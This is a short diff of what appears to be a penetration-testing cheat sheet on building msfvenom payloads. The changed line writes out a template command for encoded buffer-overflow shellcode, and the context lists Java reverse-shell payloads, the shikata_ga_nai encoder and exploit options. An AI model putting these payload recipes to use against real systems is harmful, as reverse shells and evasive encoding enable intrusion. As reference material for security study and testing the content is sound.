@@ -39,7 +39,7 @@
             *   WAR               → `-p java/shell_reverse_tcp -f war`
             *   JSP                  → `-p java/shell_reverse_tcp -f raw`
         *   BOF Shellcode
-            *   `-a [x86/x64] -p [SHELL_TYPE] -f [python/c] -b [BAD_CHARS] -e [32_BIT_ENCODER] -i 3 --smallest` → Place in Exploit
+            *   `msfvenom -a [x86/x64] -p [SHELL_TYPE] -f [python/c] -b [BAD_CHARS] -e [32_BIT_ENCODER] -i 3 --smallest`
             *   Encoders           → `x86/shikata_ga_nai` / `x86/unicode_m`
             *   Extra Options   → `BufferRegister=EAX` / `Exitfunc=thread`
             *   Auto-Migration
